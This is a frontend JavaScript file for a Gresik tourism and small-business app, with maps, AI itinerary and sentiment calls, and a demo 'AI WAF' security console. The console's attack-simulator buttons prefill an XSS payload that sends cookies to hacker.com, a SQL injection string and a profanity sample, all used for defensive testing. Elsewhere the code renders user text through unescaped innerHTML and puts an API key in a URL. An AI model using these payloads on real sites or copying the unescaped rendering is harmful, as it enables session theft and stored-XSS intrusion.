/* ==========================================================================
   FRONTEND ROUTER, LEAFLET MAPS, CHARTS & AI CONNECTIONS
   Grestrip Smart & Secure Navigator
   ========================================================================== */

document.addEventListener("DOMContentLoaded", () => {
    // -------------------------------------------------------------
    // GLOBAL APP STATE
    // -------------------------------------------------------------
    let state = {
        merchants: [],
        reviews: [],
        threats: [],
        activeMerchantId: "m1",
        map: null,
        routeLayerGroup: null,
        threatChart: null,
        apiRateLimit: { count: 0, limit: 15, remaining: 15, status: "green", percentage: 100 }
    };

    // -------------------------------------------------------------
    // DOM ELEMENTS
    // -------------------------------------------------------------
    const navItems = document.querySelectorAll(".nav-item");
    const portalPanes = document.querySelectorAll(".portal-pane");
    const mainContent = document.querySelector(".main-content");
    const globalApiKeyInput = document.getElementById("global-api-key");
    const keyBadge = document.querySelector(".key-badge");

    // -------------------------------------------------------------
    // 1. ROUTER & ROLE NAVIGATION
    // -------------------------------------------------------------
    navItems.forEach(item => {
        item.addEventListener("click", () => {
            const portal = item.getAttribute("data-portal");
            
            // Switch navigation active states
            navItems.forEach(nav => nav.classList.remove("active"));
            item.classList.add("active");
            
            // Switch visible views
            portalPanes.forEach(pane => pane.classList.remove("active"));
            const targetPane = document.getElementById(`portal-${portal}`);
            targetPane.classList.add("active");

            // Apply custom dark backgrounds when in IT Security console
            if (portal === "itsec") {
                mainContent.style.backgroundColor = "var(--color-dark-bg)";
                // Proactively pull IT Security metrics
                fetchThreatLogs();
                fetchQuotaStatus();
            } else {
                mainContent.style.backgroundColor = "#f3f6f6";
            }

            // Trigger Map refresh when wisatawan portal is opened
            if (portal === "wisatawan") {
                setTimeout(() => {
                    if (state.map) state.map.invalidateSize();
                }, 100);
            }

            // Sync Merchant Selector when entering UMKM portal
            if (portal === "umkm") {
                loadUmkmDashboard();
            }

            // Sync Admin portal metrics
            if (portal === "superadmin") {
                renderAdminPortal();
            }
        });
    });

    // Handle Gemini API Key changes
    globalApiKeyInput.addEventListener("input", (e) => {
        const value = e.target.value.trim();
        if (value) {
            keyBadge.textContent = "Real API Mode";
            keyBadge.className = "key-badge badge-active";
        } else {
            keyBadge.textContent = "Simulation Mode";
            keyBadge.className = "key-badge badge-sim";
        }
    });

    // -------------------------------------------------------------
    // 2. PORTAL WISATAWAN: DYNAMIC BUDGET & MAPS
    // -------------------------------------------------------------
    const budgetRange = document.getElementById("budget-range");
    const budgetValue = document.getElementById("budget-value");
    
    budgetRange.addEventListener("input", (e) => {
        budgetValue.textContent = `Rp ${parseInt(e.target.value).toLocaleString('id-ID')}`;
    });

    // Leaflet Maps Setup
    function initLeafletMap() {
        if (state.map) return;

        console.log("[Map] Initializing Leaflet map...");
        // Coordinate center of Gresik Kota
        state.map = L.map('leaflet-map').setView([-7.1610, 112.6565], 13);
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(state.map);

        state.routeLayerGroup = L.layerGroup().addTo(state.map);
        plotMerchantMarkers();
    }

    // Custom Marker Drawing
    function plotMerchantMarkers() {
        if (!state.map) return;
        
        // Remove older route lines
        state.routeLayerGroup.clearLayers();

        state.merchants.forEach(m => {
            const iconType = m.type === "kuliner" ? "utensils" : "compass";
            const bgClass = m.type === "kuliner" ? "marker-bowl" : "marker-compass";
            
            const customIcon = L.divIcon({
                html: `<div class="custom-map-marker ${bgClass}"><i data-lucide="${iconType}"></i></div>`,
                className: '',
                iconSize: [28, 28],
                iconAnchor: [14, 14],
                popupAnchor: [0, -10]
            });

            const popupContent = `
                <h4>${m.name}</h4>
                <p><strong>Tipe:</strong> ${m.type === "kuliner" ? "Kuliner UMKM" : "Wisata Sejarah"}</p>
                <p>${m.description.substring(0, 100)}...</p>
                <p><strong>Rating:</strong> ⭐ ${m.rating} (${m.reviewsCount} Ulasan)</p>
            `;

            L.marker(m.coords, { icon: customIcon })
             .bindPopup(popupContent)
             .addTo(state.routeLayerGroup);
        });

        lucide.createIcons();
    }

    // Draw routing lines connecting itinerary stops
    function drawItineraryRoute(timeline) {
        if (!state.map || !timeline || timeline.length === 0) return;

        // Clear previous overlays
        state.routeLayerGroup.clearLayers();
        plotMerchantMarkers(); // Plot raw nodes first

        const points = [];
        timeline.forEach(item => {
            points.push([item.lat, item.lng]);
            
            // Add custom sequential timeline marker overlay on the map
            const seqIcon = L.divIcon({
                html: `<div class="custom-map-marker marker-bowl" style="background-color: var(--color-dark); font-weight:700; font-family: monospace; font-size:10px;">Day ${item.day}</div>`,
                className: '',
                iconSize: [36, 18],
                iconAnchor: [18, 9]
            });

            L.marker([item.lat, item.lng], { icon: seqIcon })
             .bindPopup(`<strong>Day ${item.day} - Activity</strong><br>${item.activity}<br>${item.time}`)
             .addTo(state.routeLayerGroup);
        });

        // Draw connecting polyline
        const polyline = L.polyline(points, {
            color: 'var(--color-secondary)',
            weight: 4,
            opacity: 0.8,
            dashArray: '8, 8'
        }).addTo(state.routeLayerGroup);

        // Zoom map bounds to cover entire path
        state.map.fitBounds(polyline.getBounds(), { padding: [40, 40] });
    }

    // -------------------------------------------------------------
    // 3. AI ITINERARY GENERATOR CALLS
    // -------------------------------------------------------------
    const itineraryForm = document.getElementById("itinerary-form");
    const btnGenerate = document.getElementById("btn-generate");

    itineraryForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        const budget = budgetRange.value;
        const duration = document.getElementById("duration").value;
        const allergies = document.getElementById("allergies").value.trim();
        const userKey = globalApiKeyInput.value.trim();

        // Collect Checked preferences
        const preferences = [];
        document.querySelectorAll("input[name='pref']:checked").forEach(cb => {
            preferences.push(cb.value);
        });

        btnGenerate.disabled = true;
        btnGenerate.innerHTML = `<i data-lucide="loader-2" class="animate-spin"></i> Merangkai Rute...`;
        lucide.createIcons();

        try {
            const response = await fetch('/api/itinerary', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ budget, duration, preferences, allergies, userKey })
            });

            if (!response.ok) throw new Error("Gagal merangkai itinerary.");

            const data = await response.json();
            
            // Switch UI View to Itinerary Timeline Tab
            document.querySelectorAll(".tab-btn").forEach(btn => btn.classList.remove("active"));
            document.querySelector("[data-tab='timeline-view']").classList.add("active");
            document.querySelectorAll(".tab-pane").forEach(tp => tp.classList.remove("active"));
            document.getElementById("timeline-view").classList.add("active");

            // Render Timeline
            renderItineraryTimeline(data);
            
            // Draw Route line overlays
            drawItineraryRoute(data.timeline);

        } catch (err) {
            alert("Error: " + err.message);
        } finally {
            btnGenerate.disabled = false;
            btnGenerate.innerHTML = `<i data-lucide="sparkles"></i> <span>Rangkai Rute dengan AI</span>`;
            lucide.createIcons();
        }
    });

    function renderItineraryTimeline(data) {
        const titleEl = document.getElementById("iti-title");
        const descEl = document.getElementById("iti-desc");
        const allergyAlertEl = document.getElementById("iti-allergy-alert");
        const flowContainer = document.getElementById("timeline-flow");
        const totalCostEl = document.getElementById("iti-total-cost");
        const summaryFooter = document.getElementById("iti-summary-footer");

        titleEl.textContent = data.title;
        descEl.textContent = data.description;
        totalCostEl.textContent = `Rp ${data.totalCost.toLocaleString('id-ID')}`;
        summaryFooter.classList.remove("hidden");

        // Allergy alert setup
        if (data.allergyWarning) {
            allergyAlertEl.innerHTML = `<i data-lucide="shield-alert"></i> <span><strong>Proteksi Medis Aktif:</strong> ${data.allergyWarning}</span>`;
            allergyAlertEl.classList.remove("hidden");
        } else {
            allergyAlertEl.classList.add("hidden");
        }

        flowContainer.innerHTML = "";

        if (!data.timeline || data.timeline.length === 0) {
            flowContainer.innerHTML = `<p class="text-center text-gray">Gagal merender timeline.</p>`;
            return;
        }

        data.timeline.forEach(item => {
            const itemClass = item.type === "kuliner" ? "kuliner" : "wisata";
            const iconName = item.type === "kuliner" ? "utensils" : "map";
            
            const cardHtml = `
                <div class="timeline-item ${itemClass}">
                    <div class="timeline-card">
                        <span class="time-badge">Hari ${item.day} • ${item.time}</span>
                        <h5>${item.activity}</h5>
                        <p>${item.description}</p>
                        <div class="timeline-meta">
                            <span class="meta-loc"><i data-lucide="map-pin"></i> ${item.location}</span>
                            <span class="meta-cost">Estimasi: Rp ${item.cost.toLocaleString('id-ID')}</span>
                        </div>
                    </div>
                </div>
            `;
            flowContainer.insertAdjacentHTML("beforeend", cardHtml);
        });

        lucide.createIcons();
    }

    // Toggle tabs inside display card
    document.querySelectorAll(".tab-btn").forEach(btn => {
        btn.addEventListener("click", () => {
            const tabId = btn.getAttribute("data-tab");
            
            document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
            btn.classList.add("active");
            
            document.querySelectorAll(".tab-pane").forEach(tp => tp.classList.remove("active"));
            document.getElementById(tabId).classList.add("active");

            if (tabId === "map-view" && state.map) {
                setTimeout(() => state.map.invalidateSize(), 50);
            }
        });
    });

    // -------------------------------------------------------------
    // 4. USER REVIEW & AI WAF INTERCEPTORS
    // -------------------------------------------------------------
    const reviewForm = document.getElementById("review-form");
    const reviewsFeedList = document.getElementById("reviews-feed-list");

    reviewForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        const merchantId = document.getElementById("review-merchant").value;
        const userName = document.getElementById("review-user").value.trim();
        const rating = document.querySelector("input[name='rating']:checked").value;
        const text = document.getElementById("review-text").value.trim();
        const userKey = globalApiKeyInput.value.trim();

        try {
            const response = await fetch('/api/reviews', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ merchantId, userName, rating, text, userKey })
            });

            const data = await response.json();

            if (response.status === 403 && data.isBlocked) {
                // WAF INTERRUPT TRIGGER!
                triggerWafVisualBlockAlert(data);
                return;
            }

            if (!response.ok) throw new Error(data.error || "Gagal mengirim ulasan");

            // Success! Reset input & reload
            document.getElementById("review-text").value = "";
            fetchMerchantsAndReviews();
            alert("Ulasan bersih dan disetujui oleh AI WAF! Ditambahkan ke database.");

        } catch (err) {
            alert("Error WAF / Server: " + err.message);
        }
    });

    // Visual glowing block screen popup
    function triggerWafVisualBlockAlert(threat) {
        console.error("[AI WAF INTERRUPTED] Block payload!", threat);
        
        // Show glowing overlay block screen
        const overlay = document.createElement("div");
        overlay.className = "modal-overlay active";
        overlay.style.backgroundColor = "rgba(10, 0, 0, 0.9)";
        
        overlay.innerHTML = `
            <div class="modal-card" style="border: 2px solid var(--color-danger); box-shadow: 0 0 40px rgba(220, 53, 69, 0.6); text-align: center; background-color:#0d0909; color:#f87171;">
                <div style="font-size: 52px; color:var(--color-danger); margin-bottom:15px; animation: pulseR 1s infinite;"><i data-lucide="shield-x" style="width:72px; height:72px; margin:0 auto;"></i></div>
                <h2 style="font-family:'Outfit'; color:#fff; font-size:22px; margin-bottom:8px;">Aktivitas Keamanan Siber Diblokir!</h2>
                <p style="color:#fca5a5; font-size:13px; margin-bottom:15px; line-height:1.5;">${threat.reason}</p>
                <div style="background-color:#1c0d0d; border:1px solid #7f1d1d; border-radius:8px; padding:12px; font-family:monospace; font-size:11px; text-align:left; color:#fca5a5; margin-bottom:20px; overflow-x:auto;">
                    <strong>Payload Serangan Terdeteksi:</strong><br>
                    <span style="color:#ef4444; font-weight:700;">${threat.highlight}</span>
                </div>
                <button class="btn-primary" style="background-color:var(--color-danger); border:none;" onclick="this.closest('.modal-overlay').remove()">Keluar Konsol Keamanan</button>
            </div>
        `;
        
        document.body.appendChild(overlay);
        lucide.createIcons();
    }

    // Populate review lists
    function renderReviewsFeed() {
        reviewsFeedList.innerHTML = "";
        
        if (state.reviews.length === 0) {
            reviewsFeedList.innerHTML = `<p class="text-center text-gray" style="font-size:12px; padding:20px 0;">Belum ada ulasan masuk.</p>`;
            return;
        }

        // Show top 6 reviews
        state.reviews.slice(0, 6).forEach(r => {
            const merchant = state.merchants.find(m => m.id === r.merchantId);
            const placeName = merchant ? merchant.name : "UMKM";
            const stars = "★".repeat(r.rating) + "☆".repeat(5 - r.rating);
            
            const reviewHtml = `
                <div class="review-feed-item">
                    <div class="review-feed-header">
                        <div class="review-user-info">
                            <div class="review-avatar">${r.userName.substring(0,2).toUpperCase()}</div>
                            <div>
                                <span class="review-username">${r.userName}</span>
                                <span class="review-place">di ${placeName}</span>
                            </div>
                        </div>
                        <span class="review-stars">${stars}</span>
                    </div>
                    <p>"${r.text}"</p>
                    <span class="review-time">${new Date(r.timestamp).toLocaleDateString('id-ID', { hour: '2-digit', minute: '2-digit' })}</span>
                </div>
            `;
            reviewsFeedList.insertAdjacentHTML("beforeend", reviewHtml);
        });
    }

    // -------------------------------------------------------------
    // 5. PORTAL PEMILIK UMKM: BENTO GRID & DYNAMIC ANCHORS
    // -------------------------------------------------------------
    const merchantSelector = document.getElementById("merchant-selector");
    const catalogModal = document.getElementById("catalog-modal");
    const btnAddCatalog = document.getElementById("btn-add-catalog");
    const btnCloseCatalogModal = document.getElementById("btn-close-catalog-modal");
    const catalogForm = document.getElementById("modal-catalog-form");
    const catalogListContainer = document.getElementById("merchant-catalog-list");

    merchantSelector.addEventListener("change", (e) => {
        state.activeMerchantId = e.target.value;
        loadUmkmDashboard();
    });

    btnAddCatalog.addEventListener("click", () => {
        catalogModal.classList.add("active");
    });

    btnCloseCatalogModal.addEventListener("click", () => {
        catalogModal.classList.remove("active");
    });

    // Add new catalog menu
    catalogForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        const name = document.getElementById("cat-name").value.trim();
        const price = parseInt(document.getElementById("cat-price").value);
        const description = document.getElementById("cat-desc").value.trim();

        const merchant = state.merchants.find(m => m.id === state.activeMerchantId);
        if (!merchant) return;

        const newCatalog = [...merchant.catalog, {
            id: 'c_' + Date.now(),
            name,
            price,
            description
        }];

        try {
            const res = await fetch(`/api/merchants/${state.activeMerchantId}/catalog`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ catalog: newCatalog })
            });

            if (!res.ok) throw new Error("Gagal mengupdate katalog");

            const data = await res.json();
            
            // Close modal & reset
            catalogModal.classList.remove("active");
            catalogForm.reset();
            
            // Reload local merchants state
            fetchMerchantsAndReviews().then(() => {
                loadUmkmDashboard();
            });

            alert("Produk menu baru berhasil ditambahkan!");

        } catch (err) {
            alert(err.message);
        }
    });

    async function loadUmkmDashboard() {
        const merchantId = state.activeMerchantId;
        const merchant = state.merchants.find(m => m.id === merchantId);
        if (!merchant) return;

        // Stats card binding
        document.getElementById("umkm-stat-reviews").textContent = merchant.reviewsCount;
        document.getElementById("umkm-stat-rating").textContent = merchant.rating;

        // Load catalog lists
        renderMerchantCatalog(merchant);

        // Fetch AI Sentiment Analytics for the Bento Grid gauge
        const sentimentBubble = document.getElementById("sentiment-summary-box");
        sentimentBubble.textContent = "AI sedang menyinkronkan data ulasan...";

        const userKey = globalApiKeyInput.value.trim();

        try {
            const res = await fetch(`/api/sentiment/${merchantId}?userKey=${userKey}`);
            if (!res.ok) throw new Error("AI sentiment offline");
            
            const data = await res.json();
            
            // Update Speedometer Gauge
            updateSentimentGauge(data.sentimentScore);
            
            // Update Ratio bars
            document.getElementById("ratio-positive").style.width = `${data.positivePercentage}%`;
            document.getElementById("ratio-negative").style.width = `${data.negativePercentage}%`;
            document.getElementById("pos-percent").textContent = `${data.positivePercentage}%`;
            document.getElementById("neg-percent").textContent = `${data.negativePercentage}%`;

            // Update text summaries
            sentimentBubble.textContent = data.keyTakeaways;

        } catch (err) {
            sentimentBubble.textContent = "Gagal memproses analisis sentimen AI: " + err.message;
        }
    }

    function updateSentimentGauge(score) {
        const gaugeFill = document.getElementById("gauge-fill");
        const gaugeVal = document.getElementById("sentiment-score-val");
        
        gaugeVal.textContent = `${score}%`;
        
        // Gauge ring calculation (stroke-dashoffset range from 339 to 0)
        const radius = 54;
        const circumference = 2 * Math.PI * radius; // Approx 339.29
        const offset = circumference - (score / 100) * circumference;
        
        gaugeFill.style.strokeDasharray = circumference;
        gaugeFill.style.strokeDashoffset = offset;
    }

    function renderMerchantCatalog(merchant) {
        catalogListContainer.innerHTML = "";
        
        if (!merchant.catalog || merchant.catalog.length === 0) {
            catalogListContainer.innerHTML = `<p class="text-center text-gray" style="font-size:12px; padding:20px 0;">Katalog menu digital Anda kosong.</p>`;
            return;
        }

        merchant.catalog.forEach(item => {
            const rowHtml = `
                <div class="catalog-item-row">
                    <div class="cat-item-text">
                        <strong>${item.name}</strong>
                        <span>${item.description}</span>
                    </div>
                    <div class="cat-item-price-action">
                        <strong>Rp ${item.price.toLocaleString('id-ID')}</strong>
                        <button class="btn-trash" data-item-id="${item.id}" title="Hapus Menu"><i data-lucide="trash-2"></i></button>
                    </div>
                </div>
            `;
            catalogListContainer.insertAdjacentHTML("beforeend", rowHtml);
        });

        // Add Delete listener to trash buttons
        catalogListContainer.querySelectorAll(".btn-trash").forEach(btn => {
            btn.addEventListener("click", async () => {
                const itemId = btn.getAttribute("data-item-id");
                
                if (!confirm("Apakah Anda yakin ingin menghapus menu hidangan ini dari katalog digital?")) return;

                const filteredCatalog = merchant.catalog.filter(item => item.id !== itemId);

                try {
                    const res = await fetch(`/api/merchants/${merchant.id}/catalog`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ catalog: filteredCatalog })
                    });
                    if (!res.ok) throw new Error("Gagal menghapus katalog menu");
                    
                    fetchMerchantsAndReviews().then(() => {
                        loadUmkmDashboard();
                    });
                    
                } catch (err) {
                    alert(err.message);
                }
            });
        });

        lucide.createIcons();
    }

    // -------------------------------------------------------------
    // 6. PORTAL IT SECURITY: TRAFFIC LIGHTS, WAF PLAYGROUND & CHARTS
    // -------------------------------------------------------------
    const payloadTester = document.getElementById("payload-tester");
    const consoleOutput = document.getElementById("console-output");
    const ledIndicator = document.getElementById("led-indicator");
    const statusDisplay = document.getElementById("status-display");

    const trafficRed = document.getElementById("traffic-red");
    const trafficYellow = document.getElementById("traffic-yellow");
    const trafficGreen = document.getElementById("traffic-green");

    // Attack Simulator bindings
    document.getElementById("btn-prefill-xss").addEventListener("click", () => {
        payloadTester.value = `<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`;
    });

    document.getElementById("btn-prefill-sqli").addEventListener("click", () => {
        payloadTester.value = `admin' OR '1'='1' --`;
    });

    document.getElementById("btn-prefill-bullying").addEventListener("click", () => {
        payloadTester.value = `Warung bangsat jancok pelayanannya jelek anjing babi!`;
    });

    // Run custom WAF attack simulation
    document.getElementById("btn-test-waf").addEventListener("click", async () => {
        const text = payloadTester.value.trim();
        const userKey = globalApiKeyInput.value.trim();

        if (!text) {
            consoleOutput.textContent = "Silakan masukkan payload/muatan teks terlebih dahulu.";
            return;
        }

        consoleOutput.textContent = "AI WAF sedang menganalisis payload...";
        
        try {
            const response = await fetch('/api/waf/test', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text, userKey })
            });

            const data = await response.json();
            
            // Pretty format print in console output box
            consoleOutput.textContent = JSON.stringify(data, null, 2);

            // Fetch and refresh logs to show immediately
            await fetchThreatLogs();
            await fetchQuotaStatus();

            if (data.isBlocked) {
                // Flash RED siber system alerts
                ledIndicator.className = "led-light led-red";
                statusDisplay.textContent = `Blocked: ${data.type}`;
                
                trafficRed.classList.add("active");
                trafficYellow.classList.remove("active");
                trafficGreen.classList.remove("active");
                
                consoleOutput.style.color = "#f87171"; // Red text output

                // Dynamic restore status to Green after 6 seconds
                setTimeout(() => {
                    restoreItSecStatus();
                }, 6000);
            } else {
                // Successful harmless test
                ledIndicator.className = "led-light led-green";
                statusDisplay.textContent = "Clean Traffic Cleared";
                
                trafficRed.classList.remove("active");
                trafficYellow.classList.remove("active");
                trafficGreen.classList.add("active");
                
                consoleOutput.style.color = "#39ff14"; // Green text output
            }

        } catch (err) {
            consoleOutput.textContent = "Error testing payload: " + err.message;
        }
    });

    function restoreItSecStatus() {
        if (state.apiRateLimit.status === "yellow") {
            ledIndicator.className = "led-light led-yellow";
            statusDisplay.textContent = "Rate Limit Alert";
            trafficRed.classList.remove("active");
            trafficYellow.classList.add("active");
            trafficGreen.classList.remove("active");
        } else if (state.apiRateLimit.status === "red") {
            ledIndicator.className = "led-light led-red";
            statusDisplay.textContent = "WAF Limits Triggered";
            trafficRed.classList.add("active");
            trafficYellow.classList.remove("active");
            trafficGreen.classList.remove("active");
        } else {
            ledIndicator.className = "led-light led-green";
            statusDisplay.textContent = "System Secured";
            trafficRed.classList.remove("active");
            trafficYellow.classList.remove("active");
            trafficGreen.classList.add("active");
        }
        consoleOutput.style.color = "#e2e8f0";
    }

    async function fetchThreatLogs() {
        try {
            const res = await fetch('/api/threats');
            const logs = await res.json();
            state.threats = logs;

            // Render scrolling table body
            const tbody = document.getElementById("threat-logs-body");
            tbody.innerHTML = "";

            if (logs.length === 0) {
                tbody.innerHTML = `<tr><td colspan="5" class="text-center" style="color:var(--color-dark-text-muted);">Tidak ada log ancaman siber terdeteksi.</td></tr>`;
                return;
            }

            logs.forEach(log => {
                const tr = `
                    <tr>
                        <td>${new Date(log.timestamp).toLocaleTimeString('id-ID')}</td>
                        <td>${log.ip}</td>
                        <td style="color:#f87171; font-weight:700;">${log.type}</td>
                        <td><span class="threat-payload-highlight">${escapeHTML(log.payload)}</span></td>
                        <td><span class="sec-action-badge">${log.action}</span></td>
                    </tr>
                `;
                tbody.insertAdjacentHTML("beforeend", tr);
            });

            // Update distributions chart inside IT console
            renderThreatChart(logs);

        } catch (err) {
            console.error("Gagal memuat log ancaman:", err);
        }
    }

    // Helper escape to protect the IT logs view itself from XSS!
    function escapeHTML(str) {
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    }

    async function fetchQuotaStatus() {
        try {
            const res = await fetch('/api/quota');
            const data = await res.json();
            state.apiRateLimit = data;

            // Update DOM counter
            document.getElementById("quota-counter").textContent = `${data.remaining} / ${data.limit} sisa`;

            // Update Progress Bar
            const bar = document.getElementById("quota-progress-fill");
            bar.style.width = `${data.percentage}%`;

            // Update colors based on levels
            bar.className = "progress-fill";
            if (data.status === "green") {
                bar.classList.add("fill-green");
            } else if (data.status === "yellow") {
                bar.classList.add("fill-yellow");
                // Trigger WAF alert traffic light to Yellow!
                trafficRed.classList.remove("active");
                trafficYellow.classList.add("active");
                trafficGreen.classList.remove("active");
                ledIndicator.className = "led-light led-yellow";
                statusDisplay.textContent = "Rate Limit Warning";
            } else {
                bar.classList.add("fill-red");
                // Trigger WAF alert traffic light to Red!
                trafficRed.classList.add("active");
                trafficYellow.classList.remove("active");
                trafficGreen.classList.remove("active");
                ledIndicator.className = "led-light led-red";
                statusDisplay.textContent = "Rate Limit Triggered";
            }

        } catch (err) {
            console.error("Error rate limit fetch:", err);
        }
    }

    // Chart.js rendering threat analytics
    function renderThreatChart(logs) {
        const canvas = document.getElementById("threat-chart");
        if (!canvas) return;

        // Group counts by attack vectors
        const categories = { "Stored XSS": 0, "SQL Injection": 0, "Cyberbullying / Profanity": 0, "Lainnya": 0 };
        
        logs.forEach(log => {
            if (categories[log.type] !== undefined) {
                categories[log.type]++;
            } else {
                categories["Lainnya"]++;
            }
        });

        const dataPoints = Object.values(categories);
        const labels = Object.keys(categories);

        if (state.threatChart) {
            // Update chart data
            state.threatChart.data.datasets[0].data = dataPoints;
            state.threatChart.update();
        } else {
            // Initialize new chart
            state.threatChart = new Chart(canvas, {
                type: 'doughnut',
                data: {
                    labels: labels,
                    datasets: [{
                        data: dataPoints,
                        backgroundColor: ['#ef4444', '#f59e0b', '#3b82f6', '#6b7280'],
                        borderColor: '#12181f',
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'bottom',
                            labels: {
                                color: '#94a3b8',
                                font: { size: 9 }
                            }
                        }
                    }
                }
            });
        }
    }

    // -------------------------------------------------------------
    // 7. PORTAL SUPER ADMIN: LEGAL REGISTRIES
    // -------------------------------------------------------------
    const adminMerchantForm = document.getElementById("admin-merchant-form");
    const adminTotalMerchants = document.getElementById("admin-total-merchants");
    const adminMerchantsRegistry = document.getElementById("admin-merchants-registry");

    adminMerchantForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        const name = document.getElementById("reg-name").value.trim();
        const owner = document.getElementById("reg-owner").value.trim();
        const type = document.getElementById("reg-type").value;
        const description = document.getElementById("reg-desc").value.trim();
        const lat = parseFloat(document.getElementById("reg-lat").value);
        const lng = parseFloat(document.getElementById("reg-lng").value);

        try {
            const res = await fetch('/api/admin/merchants', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, owner, type, description, coords: [lat, lng] })
            });

            if (!res.ok) throw new Error("Gagal mendaftarkan UMKM");
            
            alert(`UMKM "${name}" berhasil divalidasi dan terdaftar di pariwisata Gresik secara legal!`);
            adminMerchantForm.reset();

            // Refresh local state & redraw map markers
            fetchMerchantsAndReviews().then(() => {
                renderAdminPortal();
                plotMerchantMarkers();
            });

        } catch (err) {
            alert(err.message);
        }
    });

    function renderAdminPortal() {
        adminTotalMerchants.textContent = state.merchants.length;
        
        adminMerchantsRegistry.innerHTML = "";
        state.merchants.forEach(m => {
            const badgeType = m.type === "kuliner" ? "Kuliner" : "Wisata";
            const rowHtml = `
                <div class="admin-reg-row">
                    <div class="admin-reg-info">
                        <strong>${m.name}</strong>
                        <span>Owner: ${m.owner} • Loc: ${m.coords[0].toFixed(4)}, ${m.coords[1].toFixed(4)}</span>
                    </div>
                    <span class="badge-owner">${badgeType}</span>
                </div>
            `;
            adminMerchantsRegistry.insertAdjacentHTML("beforeend", rowHtml);
        });
    }


    // -------------------------------------------------------------
    // INITIAL SYSTEM SYNC
    // -------------------------------------------------------------
    async function fetchMerchantsAndReviews() {
        try {
            const merchantsRes = await fetch('/api/merchants');
            state.merchants = await merchantsRes.json();

            const reviewsRes = await fetch('/api/reviews');
            state.reviews = await reviewsRes.json();

            // Bind selectors and feeds
            populateMerchantSelectors();
            renderReviewsFeed();
            
        } catch (err) {
            console.error("Gagal menyinkronkan data startup:", err);
        }
    }

    function populateMerchantSelectors() {
        // Sync Wisatawan Review Dropdown
        const reviewMerchantSel = document.getElementById("review-merchant");
        reviewMerchantSel.innerHTML = "";
        state.merchants.forEach(m => {
            reviewMerchantSel.insertAdjacentHTML("beforeend", `<option value="${m.id}">${m.name} (${m.type === 'kuliner' ? 'Kuliner' : 'Wisata'})</option>`);
        });

        // Sync UMKM Manager Selector
        merchantSelector.innerHTML = "";
        state.merchants.forEach(m => {
            merchantSelector.insertAdjacentHTML("beforeend", `<option value="${m.id}" ${state.activeMerchantId === m.id ? 'selected' : ''}>${m.name}</option>`);
        });
    }

    // Startup Execution!
    fetchMerchantsAndReviews().then(() => {
        initLeafletMap();
        lucide.createIcons();
    });
});
